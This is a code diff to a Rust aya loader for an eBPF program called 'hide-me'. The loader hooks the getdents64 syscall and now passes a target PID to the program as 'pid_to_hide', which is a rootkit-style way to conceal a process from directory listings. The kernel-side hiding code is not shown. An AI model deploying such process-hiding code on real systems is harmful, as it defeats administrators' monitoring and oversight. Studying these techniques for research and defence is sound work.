@@ -1,11 +1,7 @@
-use aya::{
-    include_bytes_aligned,
-    maps::array::ProgramArray,
-    programs::TracePoint,
-    EbpfLoader,
-};
+use aya::{include_bytes_aligned, maps::array::ProgramArray, programs::TracePoint, EbpfLoader};
 use aya_log::EbpfLogger;
 use clap::Parser;
+use hide_me_common::MAX_FILE_LEN;
 use log::{debug, info, warn};
 use tokio::signal;
 
@@ -18,6 +14,9 @@ struct TargetPpid {
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
     let opt = TargetPpid::parse();
+    let _line = opt.ppid.to_string();
+    let mut line: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
+    line[.._line.len()].copy_from_slice(_line.as_bytes());
 
     env_logger::init();
 
@@ -37,8 +36,13 @@ async fn main() -> Result<(), anyhow::Error> {
     // like to specify the eBPF program at runtime rather than at compile-time, you can
     // reach for `Bpf::load_file` instead.
     let mut bpf = EbpfLoader::new()
-        .set_global("pid_to_hide_len", &(opt.ppid.to_string().len() as u64 + 1), true)
+        .set_global(
+            "pid_to_hide_len",
+            &(opt.ppid.to_string().len() as u32 + 1),
+            true,
+        )
         .set_global("target_ppid", &opt.ppid, true)
+        .set_global("pid_to_hide", &line, true)
         .load(include_bytes_aligned!(
             "../../target/bpfel-unknown-none/debug/hide-me"
         ))?;
@@ -53,7 +57,11 @@ async fn main() -> Result<(), anyhow::Error> {
     program.load()?;
     program.attach("syscalls", "sys_enter_getdents64")?;
 
+
+
     let mut prog_array = ProgramArray::try_from(bpf.take_map("JUMP_TABLE").unwrap())?;
+
+
     let prog_0: &mut TracePoint = bpf
         .program_mut("handle_getdents_exit")
         .unwrap()
@@ -71,6 +79,8 @@ async fn main() -> Result<(), anyhow::Error> {
         .try_into()?;
 
     prog_1.load()?;
+
+
     let prog_1_fd = prog_1.fd().unwrap();
     prog_array.set(1, prog_1_fd, 0).unwrap();
 
